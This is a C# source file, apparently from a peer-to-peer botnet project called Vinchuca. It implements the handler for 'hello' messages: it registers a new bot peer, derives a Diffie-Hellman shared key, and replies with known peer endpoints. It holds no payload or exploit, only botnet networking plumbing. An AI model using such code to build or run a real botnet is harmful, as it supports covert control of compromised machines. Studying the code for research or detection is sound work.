using System;
using System.Diagnostics;
using Vinchuca.Crypto;
using Vinchuca.Network.Protocol.Messages;
using Vinchuca.Network.Protocol.Messages.System;
using Vinchuca.Network.Protocol.Peers;

namespace Vinchuca.Network.Protocol.Handlers
{
    public class HelloMessageHandler : IMessageHandler
    {
        private readonly PeerList _peerList;
        private readonly MessageManager _messageManager;

        public HelloMessageHandler(PeerList peerList, MessageManager messageManager)
        {
            _peerList = peerList;
            _messageManager = messageManager;
        }

        public void Handle(BotMessage botMessage)
        {
            var msg = botMessage.Message as HelloMessage;
            var endpoint = botMessage.Header.EndPoint;

            var peerInfo = new PeerInfo(botMessage.Header.BotId, endpoint);
            if (_peerList.TryRegister(peerInfo))
            {
                peerInfo.EncryptionKey = DHKeyExchange.CalculateSharedKey(msg.PublicKey, BotIdentifier.PrivateKey);
                var endpoints = _peerList.GetPeersEndPoint();
                var bestEndpoints = endpoints.GetRange(0, Math.Min(3, endpoints.Count));

                var reply = new HelloReplyMessage {
                    BotVersion = 1,
                    PublicKey = BotIdentifier.PublicKey,
                    Peers = bestEndpoints.ToArray(),
                };
                _messageManager.Send(reply, botMessage.Header.BotId, botMessage.Header.CorrelationId);
            }
        }
    }
}